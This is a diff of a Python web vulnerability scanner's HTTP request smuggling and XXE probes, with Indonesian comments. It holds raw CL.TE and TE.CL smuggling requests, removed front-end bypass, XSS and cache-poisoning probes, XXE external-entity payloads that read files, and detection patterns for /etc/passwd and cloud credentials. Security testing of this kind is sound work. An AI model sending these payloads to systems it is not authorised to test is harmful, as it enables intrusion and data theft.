-        return ("admin" in low or "dashboard" in low) and ("user" in low or "delete" in low or "upgrade" in low)
+    def _smug_has_exact_marker(responses: list[dict[str, Any]], marker: str) -> bool:
+        if not marker:
+            return False
+        # Hanya marker unik yang dipantulkan oleh parser/error response yang
+        # membuktikan sisa byte smuggled; status 400/404 saja tidak cukup.
+        for item in responses[1:]:
+            if int(item.get("status", 0)) not in {400, 405, 501}:
+                continue
+            haystack = "\n".join((str(item.get("reason") or ""), str(item.get("body") or "")))
+            if marker.lower() in haystack.lower():
+                return True
+        return False
+
+    def _smug_probe_clte_round(self, marker: str, base_path: str) -> tuple[bool, str]:
+        """CL.TE: sisa marker setelah zero-chunk harus mengawali method berikutnya."""
+        host = self._smug_host_header()
+        tail = marker.encode("ascii")
+        body = b"0\r\n\r\n" + tail
+        attack = self._smug_build(
+            f"POST {base_path} HTTP/1.1",
+            [("Host", host), ("Content-Length", str(len(body))),
+             ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
+            body,
+        )
+        follow = self._smug_get(f"/?satria_follow={marker.lower()}", close=True)
+        responses, elapsed, error = self._smug_exchange([attack, follow], expect=2)
+        ok = self._smug_has_exact_marker(responses, marker)
+        evidence = (
+            f"CL.TE: marker residual {marker!r} ditemukan pada respons parser kedua; "
+            f"statuses={[x.get('status') for x in responses[:2]]}, elapsed={elapsed:.2f}s"
+        )
+        if error:
+            evidence += f", transport={error}"
+        return ok, evidence
+
+    def _smug_probe_tecl_round(self, marker: str, base_path: str) -> tuple[bool, str]:
+        """TE.CL: backend yang memakai Content-Length meninggalkan marker+GET."""
+        host = self._smug_host_header()
+        # Backend CL mengambil tepat 4 byte DATA; request parser berikutnya
+        # kemudian melihat marker unik di depan method GET.
+        inner = b"DATA" + marker.encode("ascii") + f"GET /?satria_inner={marker.lower()} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode("ascii")
+        chunked = f"{len(inner):x}\r\n".encode("ascii") + inner + b"\r\n0\r\n\r\n"
+        attack = self._smug_build(
+            f"POST {base_path} HTTP/1.1",
+            [("Host", host), ("Content-Length", "4"),
+             ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
+            chunked,
+        )
+        follow = self._smug_get(f"/?satria_follow={marker.lower()}", close=True)
+        responses, elapsed, error = self._smug_exchange([attack, follow], expect=2)
+        ok = self._smug_has_exact_marker(responses, marker)
+        evidence = (
+            f"TE.CL: marker residual {marker!r} ditemukan pada respons parser kedua; "
+            f"statuses={[x.get('status') for x in responses[:2]]}, elapsed={elapsed:.2f}s"
+        )
+        if error:
+            evidence += f", transport={error}"
+        return ok, evidence
+
+    def _smug_confirm_variant(self, kind: str, base_path: str, header_variant: tuple[str, str] | None = None,
+                              trials: int = 2) -> tuple[bool, str]:
+        evidence: list[str] = []
+        for _ in range(max(2, min(int(trials), 3))):
+            if not self._within_budget():
+                return False, "budget exhausted"
+            token = uuid.uuid4().hex[:12].upper()
+            marker = "SATRIASMUG" + token
+            control_ok, control = self._smug_control_pipeline(token.lower())
+            if not control_ok:
+                return False, "baseline pipelining HTTP/1.1 tidak konsisten; desync tidak diklaim"
+            if kind == "clte":
+                if header_variant is None:
+                    ok, ev = self._smug_probe_clte_round(marker, base_path)
+                else:
+                    # Hanya variasi non-CRLF pada header transfer-encoding.
+                    host = self._smug_host_header()
+                    body = b"0\r\n\r\n" + marker.encode("ascii")
+                    attack = self._smug_build(
+                        f"POST {base_path} HTTP/1.1",
+                        [("Host", host), ("Content-Length", str(len(body))),
+                         header_variant, ("Connection", "keep-alive")], body,
+                    )
+                    follow = self._smug_get(f"/?satria_follow={token.lower()}", close=True)
+                    responses, elapsed, err = self._smug_exchange([attack, follow], expect=2)
+                    ok = self._smug_has_exact_marker(responses, marker)
+                    ev = f"TE-header variant {header_variant!r}: marker {marker!r}; statuses={[x.get('status') for x in responses[:2]]}; elapsed={elapsed:.2f}s"
+                    if err:
+                        ev += f", transport={err}"
+            elif kind == "tecl":
+                ok, ev = self._smug_probe_tecl_round(marker, base_path)
+            else:
+                return False, "unknown variant"
+            if not ok:
+                return False, "no exact parser-residual marker; no finding"
+            evidence.append(ev)
+        return True, evidence[-1]
 
     def _smug_mark(self, num: int, ev: str, method_name: str):
-        point = Point(key=f"smuggling-{num}", kind="endpoint", label=f"HTTP request smuggling {self.target_url}",
-                      url=self.target_url, name="request-smuggling", original="", page_url=self.target_url,
-                      method="RAW", interest=8)
+        point = Point(
+            key=f"smuggling-{num}", kind="endpoint",
+            label=f"HTTP request smuggling {self.target_url}",
+            url=self.target_url, name="request-smuggling", original="",
+            page_url=self.target_url, method="RAW", interest=8,
+        )
         self._mark(num, point, ev, method_name)
 
     def phase_smuggling(self, pages: list[Page], points: list[Point]) -> None:
-        """Deteksi HTTP request smuggling (91-112) dengan pipelining koneksi tunggal.
+        """Konfirmasi desync dengan kontrol pipelining dan marker residual acak.
 
-        Lab 96, 98-101, 109-111 bergantung pada lalu lintas korban/HTTP2/TLS tunnelling
-        dan tidak dapat dibuktikan dari satu klien HTTP/1.1; lab tersebut dibiarkan
-        not_confirmed alih-alih diklaim tanpa bukti.
+        Respons 400/404/405 generik, perubahan status, header proxy, atau delay
+        tunggal tidak cukup. Semua konfirmasi wajib berulang dua kali dan marker
+        harus muncul pada respons parser kedua. HTTP/2, client-side desync, queue
+        poisoning, cache poisoning, dan eksploitasi trafik pihak lain tidak diuji.
         """
         if not self.target_url or not self._within_budget():
             return
-        scheme, port, host, path = self._smug_target()
-        if not host:
+        scheme, _port, host, path = self._smug_target()
+        if not host or scheme not in {"http", "https"}:
             return
-        import time as _time
-        base_path = path if (path or "").startswith("/") else "/" + (path or "")
-        token = uuid.uuid4().hex[:8]
+        base_path = path if path.startswith("/") else "/" + path
 
-        cluster_host = host
-        try:
-            err_page = self._request("GET", self.target_url, allow_redirects=True)
-        except Exception:
-            err_page = None
-        if err_page is not None and err_page.error:
-            return
-
-        # ---------- 92/105: TE.CL ----------
-        tecl_seen = False
-        if 92 not in self._confirmed and self._within_budget() and self._smug_te_frontend():
-            inner = f"GPOST / HTTP/1.1\r\nHost: {cluster_host}\r\nContent-Length: 15\r\n\r\nx="
-            hexlen = format(len(inner), "x")
-            chunked = f"{hexlen}\r\n{inner}\r\n0\r\n\r\n"
-            smuggle = self._smug_build(
-                f"POST {base_path} HTTP/1.1",
-                [("Host", cluster_host), ("Content-Length", str(len(hexlen) + 2)),
-                 ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
-                chunked.encode())
-            ok, ev = self._smug_desync(smuggle, "/")
+        if 91 not in self._confirmed and 104 not in self._confirmed and self._within_budget():
+            ok, ev = self._smug_confirm_variant("clte", base_path, trials=2)
             if ok:
-                tecl_seen = True
-                self._smug_mark(92, "TE.CL differential terkonfirmasi (dua percobaan): " + ev,
-                                "smuggling_te_cl_differential")
-                self._smug_mark(105, "Basic TE.CL terkonfirmasi dari bukti pipeline TE.CL: " + ev,
-                                "smuggling_basic_te_cl")
+                self._smug_mark(91, "CL.TE differential terkonfirmasi dua kali dengan marker parser unik: " + ev,
+                                "smuggling_cl_te_exact_residual")
+                self._smug_mark(104, "Basic CL.TE terkonfirmasi melalui residual request parser: " + ev,
+                                "smuggling_basic_cl_te_exact_residual")
 
-        # ---------- 91/104: CL.TE ----------
-        clte_seen = False
-        if 91 not in self._confirmed and 92 not in self._confirmed and self._within_budget():
-            bodies = ["0\r\n\r\nG", "0\r\n\r\nGET /404-smug HTTP/1.1\r\nX: y\r\n\r\n"]
-            for body in bodies:
-                if 91 in self._confirmed or not self._within_budget():
-                    break
-                smuggle = self._smug_build(
-                    f"POST {base_path} HTTP/1.1",
-                    [("Host", cluster_host), ("Content-Length", str(len(body))),
-                     ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
-                    body.encode())
-                ok, ev = self._smug_desync(smuggle, "/")
-                if ok:
-                    clte_seen = True
-                    self._smug_mark(91, "CL.TE differential terkonfirmasi (dua percobaan): " + ev,
-                                    "smuggling_cl_te_differential")
-                    self._smug_mark(104, "Basic CL.TE terkonfirmasi dari bukti pipeline CL.TE: " + ev,
-                                    "smuggling_basic_cl_te")
-                    break
+        if 92 not in self._confirmed and 105 not in self._confirmed and self._within_budget():
+            ok, ev = self._smug_confirm_variant("tecl", base_path, trials=2)
+            if ok:
+                self._smug_mark(92, "TE.CL differential terkonfirmasi dua kali dengan marker parser unik: " + ev,
+                                "smuggling_te_cl_exact_residual")
+                self._smug_mark(105, "Basic TE.CL terkonfirmasi melalui residual request parser: " + ev,
+                                "smuggling_basic_te_cl_exact_residual")
 
-        # ---------- 93/94: bypass kontrol front-end ----------
-        if 93 not in self._confirmed and (clte_seen or 91 in self._confirmed) and self._within_budget():
-            admin_paths = ["/admin"]
-            for pg in pages[:8]:
-                for link in getattr(pg, "links", [])[:40]:
-                    if "admin" in (link or "").lower() and self._same_origin(link) and link not in admin_paths:
-                        admin_paths.append(urlparse(link).path or "/admin")
-            for ap in admin_paths[:3]:
-                if 93 in self._confirmed or not self._within_budget():
-                    break
-                b_status, b_body, _, _ = self._smug_normal_status(ap)
-                smuggled = f"GET {ap} HTTP/1.1\r\nHost: {cluster_host}\r\n\r\n"
-                body = "0\r\n\r\n" + smuggled
-                smuggle = self._smug_build(
-                    f"POST {base_path} HTTP/1.1",
-                    [("Host", cluster_host), ("Content-Length", "5"),
-                     ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
-                    body.encode())
-                res, _, _ = self._smug_exchange([smuggle, self._smug_get("/admin", close=True)], 2)
-                hit = next((r for r in res[1:] if self._smug_admin_text(r.get("body", ""))), None)
-                if hit is not None and b_status in (401, 403, 404, 302) and not self._smug_admin_text(b_body):
-                    self._smug_mark(93, f"CL.TE bypass front-end: baseline GET {ap} -> {b_status}, "
-                                        f"respons hasil smuggle -> {hit['status']} berisi konten admin "
-                                        f"({(hit.get('body') or '')[:110]!r}).",
-                                    "smuggling_cl_te_bypass_frontend")
-                    break
-
-        if 94 not in self._confirmed and (tecl_seen or 92 in self._confirmed) and self._within_budget():
-            ap = "/admin"
-            b_status, b_body, _, _ = self._smug_normal_status(ap)
-            inner = f"GET {ap} HTTP/1.1\r\nHost: {cluster_host}\r\nContent-Length: 10\r\n\r\nx="
-            hexlen = format(len(inner), "x")
-            chunked = f"{hexlen}\r\n{inner}\r\n0\r\n\r\n"
-            smuggle = self._smug_build(
-                f"POST {base_path} HTTP/1.1",
-                [("Host", cluster_host), ("Content-Length", str(len(hexlen) + 2)),
-                 ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
-                chunked.encode())
-            res, _, _ = self._smug_exchange([smuggle, self._smug_get("/admin", close=True)], 2)
-            hit = next((r for r in res[1:] if self._smug_admin_text(r.get("body", ""))), None)
-            if hit is not None and b_status in (401, 403, 404, 302) and not self._smug_admin_text(b_body):
-                self._smug_mark(94, f"TE.CL bypass front-end: baseline GET {ap} -> {b_status}, "
-                                    f"respons hasil smuggle -> {hit['status']} berisi konten admin.",
-                                "smuggling_te_cl_bypass_frontend")
-
-        # 102 (0.CL) dan 103 (CL.0) tidak dikonfirmasi dari satu klien: sisa body yang
-        # dieksekusi server terlihat identik dengan pipelining HTTP/1.1 yang sah, sehingga
-        # klaim apa pun akan menjadi false positive. Keduanya dibiarkan not_confirmed.
-
-        # ---------- 106: obfuscating the TE header ----------
-        if 106 not in self._confirmed and not clte_seen and self._within_budget():
-            variants = [
-                ("Transfer-Encoding", "xchunked"),
-                ("Transfer-Encoding", " chunked"),
-                ("Transfer-Encoding", "chunked\r\nTransfer-Encoding: x"),
-                ("Transfer-Encoding\t", "chunked"),
+        # 106: header obfuscation hanya dikonfirmasi bila varian header tertentu
+        # menghasilkan bukti residual yang sama, bukan karena server merespons 4xx.
+        if 106 not in self._confirmed and 91 not in self._confirmed and self._within_budget():
+            variants = (
+                ("Transfer-encoding", "chunked"),
+                ("TRANSFER-ENCODING", "chunked"),
                 ("Transfer-Encoding", "chunked, identity"),
-                ("Transfer-encoding", "CHUNKED"),
-            ]
-            for hname, hval in variants:
+                ("Transfer-Encoding", "xchunked"),
+            )
+            for variant in variants:
                 if 106 in self._confirmed or not self._within_budget():
                     break
-                body = "0\r\n\r\nGET /404-obf HTTP/1.1\r\nX: y\r\n\r\n"
-                smuggle = self._smug_build(
-                    f"POST {base_path} HTTP/1.1",
-                    [("Host", cluster_host), ("Content-Length", str(len(body))),
-                     (hname, hval), ("Connection", "keep-alive")],
-                    body.encode())
-                ok, ev = self._smug_desync(smuggle, "/")
+                ok, ev = self._smug_confirm_variant("clte", base_path, header_variant=variant, trials=2)
                 if ok:
-                    self._smug_mark(106, f"Obfuscation TE terkonfirmasi ({hname!r}: {hval!r}): " + ev,
-                                    "smuggling_obfuscating_te_header")
+                    self._smug_mark(106, f"TE header obfuscation {variant!r} memicu residual marker unik dua kali: {ev}",
+                                    "smuggling_obfuscated_te_exact_residual")
                     break
 
-        # ---------- 95: reveal front-end request rewriting ----------
-        if 95 not in self._confirmed and (clte_seen or 91 in self._confirmed) and self._within_budget():
-            targets: list[tuple[str, str]] = []
-            for pg in pages[:10]:
-                for form in getattr(pg, "forms", [])[:5]:
-                    if (getattr(form, "method", "get") or "get").lower() != "post":
-                        continue
-                    for name, _val, _typ in getattr(form, "fields", [])[:6]:
-                        if (name or "").lower() in ("search", "q", "query", "message", "comment", "text", "name", "email"):
-                            targets.append((getattr(form, "action", self.target_url) or self.target_url, name))
-            if not targets:
-                targets = [(self.target_url, "search")]
-            for rurl, rparam in targets[:2]:
-                if 95 in self._confirmed or not self._within_budget():
-                    break
-                rpath = urlparse(rurl).path or "/"
-                smuggled = (f"POST {rpath} HTTP/1.1\r\nHost: {cluster_host}\r\n"
-                            "Content-Type: application/x-www-form-urlencoded\r\n"
-                            "Content-Length: 120\r\n\r\n" + rparam + "=")
-                body = "0\r\n\r\n" + smuggled
-                smuggle = self._smug_build(
-                    f"POST {base_path} HTTP/1.1",
-                    [("Host", cluster_host), ("Content-Length", "5"),
-                     ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
-                    body.encode())
-                res, _, _ = self._smug_exchange([smuggle, self._smug_get("/", close=True)], 2)
-                for r in res[1:]:
-                    txt = r.get("body") or ""
-                    if re.search(r"(X-Forwarded-(?:For|Host|Proto)|X-Real-IP|X-Client-IP|CF-Connecting-IP)\s*:", txt, re.I):
-                        self._smug_mark(95, f"Rewriting front-end terungkap: header internal ter-refleksi pada respons "
-                                            f"follow-up (HTTP {r['status']}) setelah smuggle ke {rpath} param {rparam}.",
-                                        "smuggling_reveal_frontend_rewriting")
-                        break
+        # Lab 93-103 dan 107-112 yang membutuhkan bypass akses, pembacaan request
+        # pengguna lain, HTTP/2, cache/response-queue poisoning atau koneksi tertahan
+        # tidak dijalankan oleh probe aman ini; status tetap not_confirmed.
 
-        # ---------- 97: deliver reflected XSS ----------
-        if 97 not in self._confirmed and (clte_seen or 91 in self._confirmed) and self._within_budget():
-            xss = "<script>alert(1)</script>"
-            smuggled = f"GET /?search={xss} HTTP/1.1\r\nHost: {cluster_host}\r\n\r\n"
-            body = "0\r\n\r\n" + smuggled
-            smuggle = self._smug_build(
-                f"POST {base_path} HTTP/1.1",
-                [("Host", cluster_host), ("Content-Length", "5"),
-                 ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
-                body.encode())
-            res, _, _ = self._smug_exchange([smuggle, self._smug_get("/", close=True)], 2)
-            if any(xss in (r.get("body") or "") for r in res[1:]):
-                self._smug_mark(97, "Smuggled request menghasilkan reflected XSS payload tanpa encoding pada "
-                                    "respons follow-up.", "smuggling_deliver_reflected_xss")
-
-        # ---------- 107: web cache poisoning via smuggling ----------
-        if 107 not in self._confirmed and (clte_seen or 91 in self._confirmed) and self._within_budget():
-            poison_path = f"/?satria_smug={token}"
-            smuggled = f"GET {poison_path} HTTP/1.1\r\nHost: {cluster_host}\r\nX-Ignore: x\r\n\r\n"
-            body = "0\r\n\r\n" + smuggled
-            smuggle = self._smug_build(
-                f"POST {base_path} HTTP/1.1",
-                [("Host", cluster_host), ("Content-Length", "5"),
-                 ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
-                body.encode())
-            b_res, _, _ = self._smug_exchange([self._smug_get(poison_path, close=True)], 1)
-            self._smug_exchange([smuggle], 1)
-            f_res, _, _ = self._smug_exchange([self._smug_get(poison_path, close=True)], 1)
-            if b_res and f_res:
-                bh = {k.lower(): v.lower() for k, v in b_res[0]["headers"].items()}
-                fh = {k.lower(): v.lower() for k, v in f_res[0]["headers"].items()}
-                cache_hdr = " ".join(fh.get(k, "") for k in ("x-cache", "x-cache-status", "cf-cache-status", "age"))
-                if f_res[0]["status"] != b_res[0]["status"] and (cache_hdr.strip() or f_res[0]["status"] in (301, 302, 400, 404)):
-                    self._smug_mark(107, f"Cache poisoning via smuggling: GET {poison_path} baseline "
-                                         f"{b_res[0]['status']} -> setelah smuggle {f_res[0]['status']} "
-                                         f"(cache={cache_hdr.strip()[:60]!r}).",
-                                    "smuggling_web_cache_poisoning")
-
-        # ---------- 112: pause-based ----------
-        if 112 not in self._confirmed and 91 not in self._confirmed and 92 not in self._confirmed and self._within_budget():
-            smuggle = self._smug_build(
-                f"POST {base_path} HTTP/1.1",
-                [("Host", cluster_host), ("Content-Length", "30"), ("Connection", "keep-alive")],
-                b"")
-            try:
-                s = self._smug_connect(timeout=max(6.0, float(getattr(self, "timeout", 8.0) or 8.0)))
-            except Exception:
-                s = None
-            if s is not None:
-                buf = b""
-                try:
-                    s.sendall(smuggle)
-                    _time.sleep(0.6)
-                    s.sendall(f"GET /404-{token} HTTP/1.1\r\nHost: {cluster_host}\r\n\r\n".encode())
-                    s.sendall(self._smug_get("/", close=True))
-                    try:
-                        s.shutdown(socket.SHUT_WR)
-                    except Exception:
-                        pass
-                    deadline = _time.time() + max(6.0, float(getattr(self, "timeout", 8.0) or 8.0))
-                    while _time.time() < deadline:
-                        try:
-                            chunk = s.recv(8192)
-                        except Exception:
-                            break
-                        if not chunk:
-                            break
-                        buf += chunk
-                except Exception:
-                    pass
-                finally:
-                    try:
-                        s.close()
-                    except Exception:
-                        pass
-                res = self._smug_parse_responses(buf)
-                second = res[1] if len(res) > 1 else None
-                if second is not None and second["status"] in (400, 404, 405, 501):
-                    b_status, _, _, _ = self._smug_normal_status("/")
-                    if b_status not in (400, 404, 405, 501):
-                        self._smug_mark(112, f"Pause-based smuggling: baseline GET / -> {b_status}, "
-                                             f"respons kedua setelah jeda -> {second['status']}.",
-                                        "smuggling_pause_based")
 
     def phase_ssrf(self, pages: list[Page], points: list[Point]) -> None:
         """Deteksi konservatif SSRF (84-90). Konfirmasi hanya pada bukti kuat:
@@ -8012,541 +8024,457 @@ class SatriaBaruScanner:
         # tetap not_confirmed (anti false positive).
 
 
-    # ======================== XXE (75-83, multi-vektor & bukti kuat) ========================
+    # ======================== XXE (75-83, discovery-driven & anti-FP) ========================
 
     @staticmethod
     def _xxe_file_marker(text: str):
-        """Marker isi file yang spesifik (bukan kata umum) untuk mengurangi false positive."""
+        """Marker file OS spesifik; bukan kata umum yang sering ada di halaman."""
         if not text:
             return None
+        decoded = html_module.unescape(str(text))
         checks = (
-            (re.compile(r"\broot:[^:\r\n]{0,40}:0:0:"), "/etc/passwd (root:x:0:0)"),
-            (re.compile(r"\bdaemon:[^:\r\n]{0,40}:1:1:"), "/etc/passwd (daemon)"),
-            (re.compile(r"for 16-bit app support", re.I), "Windows win.ini"),
-            (re.compile(r"(?im)^\s*\[(?:fonts|mci extensions)\]\s*$"), "Windows win.ini"),
+            (re.compile(r"(?im)(?:^|[>\s])root:[^:\r\n]{0,24}:0:0:[^\r\n<]{0,180}"), "/etc/passwd root entry"),
+            (re.compile(r"(?im)(?:^|[>\s])daemon:[^:\r\n]{0,24}:1:1:[^\r\n<]{0,180}"), "/etc/passwd daemon entry"),
+            (re.compile(r"(?im)^\s*for 16-bit app support\s*$"), "Windows win.ini"),
+            (re.compile(r"(?im)^\s*\[(?:fonts|mci extensions)\]\s*$"), "Windows win.ini section"),
         )
-        for pat, label in checks:
-            m = pat.search(text)
-            if m:
-                return label, m.group(0)
+        for pattern, label in checks:
+            match = pattern.search(decoded)
+            if match:
+                return label, match.group(0).strip()
         return None
 
     @staticmethod
     def _xxe_metadata_marker(text: str):
+        """Hanya marker metadata yang eksplisit; tidak dipakai untuk probing internal."""
         if not text:
             return None
         checks = (
-            (re.compile(r'"(?:AccessKeyId|SecretAccessKey)"\s*:'), "kredensial metadata IAM"),
-            (re.compile(r"\b(?:ami-id|instance-id|placement/availability-zone)\b"), "metadata instance"),
+            (re.compile(r'"(?:AccessKeyId|SecretAccessKey|Token)"\s*:'), "cloud credential metadata"),
+            (re.compile(r'"(?:instanceId|imageId|accountId)"\s*:'), "instance identity metadata"),
         )
-        for pat, label in checks:
-            m = pat.search(text)
-            if m:
-                return label, m.group(0)
+        for pattern, label in checks:
+            match = pattern.search(text)
+            if match:
+                return label, match.group(0)
         return None
 
-    def _xxe_endpoints(self, pages: list[Page]) -> list[str]:
-        pu = urlparse(self.target_url)
-        base = f"{pu.scheme}://{pu.netloc}"
-        found: list[str] = []
+    def _xxe_endpoints(self, pages: list[Page], points: list[Point] | None = None) -> list[str]:
+        """Temukan endpoint dari form/JS/XML aktual; jangan menebak URL umum."""
+        candidates: dict[str, int] = {}
+        base = self.target_url
 
-        def add(raw: str) -> None:
-            raw = (raw or "").strip()
+        def add(raw: str, score: int = 1) -> None:
+            raw = str(raw or "").strip()
             if not raw or raw.startswith(("javascript:", "mailto:", "data:", "#")):
                 return
             try:
-                absolute = raw if re.match(r"^https?://", raw, re.I) else urljoin(base + "/", raw.lstrip("/"))
-                cu = canonical_url(absolute)
+                absolute = urljoin(base, raw)
+                parsed = urlparse(absolute)
+                if parsed.scheme not in {"http", "https"} or not parsed.hostname:
+                    return
+                canonical = canonical_url(absolute)
+                if not self._same_origin(canonical):
+                    return
+                if DESTRUCTIVE_PATH_RE.search(parsed.path or "/"):
+                    return
+                candidates[canonical] = max(candidates.get(canonical, 0), int(score))
             except Exception:
                 return
-            if not cu or not self._same_origin(cu):
-                return
-            if DESTRUCTIVE_PATH_RE.search(urlparse(cu).path or "/"):
-                return
-            if cu not in found:
-                found.append(cu)
 
-        for path in ("product/stock", "product/stock/check", "stock", "stock/check", "api/stock",
-                     "checkstock", "product/check", "xml", "soap", "api/xml", "feedback/submit"):
-            add(path)
-        for page in pages[:25]:
-            add(page.url)
-            for form in getattr(page, "forms", [])[:10]:
-                names = {str(n).lower() for n, _, _ in getattr(form, "fields", [])}
-                if names & {"productid", "storeid"} or re.search(r"stock|xml|soap", getattr(form, "action", "") or "", re.I):
-                    add(form.action)
-            blob = (page.text or "") + "\n" + (page.js_text or "")
-            for m in re.finditer(r"""<form[^>]+action=["']([^"']+)["']""", blob, re.I):
-                if re.search(r"stock|xml|soap|product", m.group(1), re.I):
-                    add(m.group(1))
-            for m in re.finditer(r"""['"]([^'"\s]{0,120}(?:stock|xml|soap)[^'"\s]{0,120})['"]""", blob, re.I):
-                add(m.group(1))
-        # Halaman produk memuat pemanggilan stock check pada JS.
-        if self._lab_session_login():
-            for probe in ("product?productId=1", ""):
-                if not self._within_budget():
-                    break
-                url = urljoin(base + "/", probe)
-                resp = self._request("GET", url, allow_redirects=True)
-                if resp.error or not resp.text:
+        # Point XML merupakan bukti endpoint dari discovery utama.
+        for point in points or []:
+            if getattr(point, "kind", "") == "xml":
+                add(point.url, 12)
+
+        for page in pages or []:
+            headers = {str(k).lower(): str(v).lower() for k, v in (getattr(page, "headers", {}) or {}).items()}
+            if "xml" in headers.get("content-type", "") or "soap" in headers.get("content-type", ""):
+                add(page.url, 10)
+            for form in getattr(page, "forms", []) or []:
+                try:
+                    action = urljoin(page.url, form.action or page.url)
+                    names = {str(name).strip().lower() for name, _value, _typ in form.fields}
+                    path = (urlparse(action).path or "").lower()
+                    field_signal = bool(names & {"productid", "storeid", "xml", "soap", "document", "payload"})
+                    path_signal = bool(re.search(r"(?:stock|inventory|xml|soap|product/check)", path, re.I))
+                    if str(form.method or "GET").upper() == "POST" and (field_signal or path_signal):
+                        add(action, 9 if field_signal and path_signal else 7)
+                except Exception:
                     continue
-                blob = resp.text or ""
-                for m in re.finditer(r"""['"]([^'"\s]{0,140}(?:stock|xml|soap)[^'"\s]{0,140})['"]""", blob, re.I):
-                    add(m.group(1))
-                for m in re.finditer(r"""\b(?:fetch|axios\.(?:get|post|request)|\.open)\s*\(\s*(?:['"][A-Za-z]+['"]\s*,\s*)?['"]([^'"]{1,200})['"]""", blob, re.I):
-                    add(m.group(1))
 
-        def score(u: str) -> int:
-            ul = u.lower()
-            s = 0
-            for kw, w in (("stock", 10), ("xml", 7), ("soap", 6), ("product", 5), ("api", 3), ("check", 3)):
-                if kw in ul:
-                    s += w
-            return -s
+            blob = (getattr(page, "text", "") or "") + "\n" + (getattr(page, "js_text", "") or "")
+            # Literal endpoint references in actual page/JS source.
+            for match in re.finditer(r"['\"]((?:/|https?://)[^'\"\s]{1,220})['\"]", blob, re.I):
+                candidate = match.group(1)
+                if re.search(r"(?:stock|inventory|xml|soap|product/check)", candidate, re.I):
+                    add(candidate, 6)
+            for match in re.finditer(
+                r"(?:fetch|axios\.(?:get|post|request)|\.open|\.post)\s*\(\s*(?:['\"][A-Z]+['\"]\s*,\s*)?['\"]([^'\"]{1,220})['\"]",
+                blob, re.I,
+            ):
+                add(match.group(1), 8)
 
-        ordered = [canonical_url(self.target_url)]
-        for u in sorted(found, key=score):
-            if u not in ordered:
-                ordered.append(u)
-        return ordered[:10]
+        return [url for url, _score in sorted(candidates.items(), key=lambda item: (-item[1], item[0]))[:12]]
 
     def _xxe_post_xml(self, url: str, xml_body: str) -> "Response":
+        if not self._same_origin(url):
+            return Response(None, url, "", {}, 0.0, error="out_of_scope")
         attempts = (
             {"Content-Type": "application/xml; charset=UTF-8", "Accept": "application/xml,text/xml,text/plain,*/*"},
             {"Content-Type": "text/xml; charset=UTF-8", "Accept": "application/xml,text/xml,text/plain,*/*"},
-            {"Content-Type": "application/xml", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest"},
         )
         last = None
         for headers in attempts:
             if not self._within_budget():
                 break
-            resp = self._request("POST", url, data=xml_body, headers=headers)
+            resp = self._request("POST", url, data=xml_body, headers=headers, allow_redirects=False)
             last = resp
-            if resp.error:
-                continue
-            if resp.status in (401, 403, 404, 405):
+            if resp.error or resp.status != 415:
                 return resp
-            if resp.status == 415:
-                continue
-            return resp
         return last if last is not None else Response(None, url, "", {}, 0.0, error="budget_exhausted")
 
-    def _xxe_endpoint_ready(self, url: str) -> tuple[bool, "Response | None"]:
+    def _xxe_endpoint_ready(self, url: str, point: Point | None = None) -> tuple[bool, "Response | None"]:
+        """Endpoint XML hanya dipakai bila dua baseline benign stabil dan 2xx."""
         cache = getattr(self, "_xxe_ready", None)
         if cache is None:
             cache = {}
             self._xxe_ready = cache
-        if url in cache:
-            return cache[url]
+        cache_key = (url, getattr(point, "key", "") if point else "")
+        if cache_key in cache:
+            return cache[cache_key]
         benign = ('<?xml version="1.0" encoding="UTF-8"?>'
                   '<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>')
-        resp = self._xxe_post_xml(url, benign)
-        if resp is None or resp.error or resp.status is None:
-            cache[url] = (False, resp)
-            return cache[url]
-        if resp.status in (301, 302, 303, 307, 308, 401, 403, 404, 405, 415):
-            cache[url] = (False, resp)
-            return cache[url]
-        low = (resp.text or "").lower()
-        if ("password" in low and "login" in low) or "<title>login" in low:
-            cache[url] = (False, resp)
-            return cache[url]
-        cache[url] = (True, resp)
-        return cache[url]
+        if point is not None:
+            first = self.send(point, point.original or "1")
+            second = self.send(point, point.original or "1") if self._within_budget() else None
+        else:
+            first = self._xxe_post_xml(url, benign)
+            second = self._xxe_post_xml(url, benign) if self._within_budget() else None
+        if (first is None or second is None or first.error or second.error
+                or first.status is None or second.status is None
+                or not (200 <= first.status < 300) or first.status != second.status
+                or first.status in {204}):
+            cache[cache_key] = (False, first)
+            return cache[cache_key]
+        first_text = first.normalized
+        second_text = second.normalized
+        if similarity(first_text, second_text) < 0.72:
+            cache[cache_key] = (False, first)
+            return cache[cache_key]
+        combined = (first.text or "").lower()
+        if (("password" in combined and "login" in combined)
+                or "<title>login" in combined
+                or "name=\"password\"" in combined):
+            cache[cache_key] = (False, first)
+            return cache[cache_key]
+        cache[cache_key] = (True, first)
+        return cache[cache_key]
 
-    def _xxe_bodies(self, uri: str) -> list[str]:
-        return [
-            ('<?xml version="1.0" encoding="UTF-8"?>\n'
-             f'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{uri}"> ]>\n'
-             '<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'),
-            ('<?xml version="1.0" encoding="UTF-8"?>\n'
-             f'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{uri}"> ]>\n'
-             '<stockCheck><productId>1</productId><storeId>1</storeId><name>&xxe;</name></stockCheck>'),
-            ('<?xml version="1.0" encoding="UTF-8"?>\n'
-             f'<!DOCTYPE data [ <!ENTITY file SYSTEM "{uri}"> ]>\n'
-             '<data><id>&file;</id></data>'),
-            ('<?xml version="1.0" encoding="UTF-8"?>\n'
-             f'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{uri}"> ]>\n'
-             '<foo>&xxe;</foo>'),
-        ]
+    def _xxe_bodies(self, uri: str, point: Point | None = None, entity_name: str = "satria_ext") -> list[str]:
+        """Buat payload XML minimal dengan entity di field yang benar-benar teramati."""
+        safe_uri = html_module.escape(str(uri), quote=True)
+        field_name = str(getattr(point, "name", "productId") or "productId") if point else "productId"
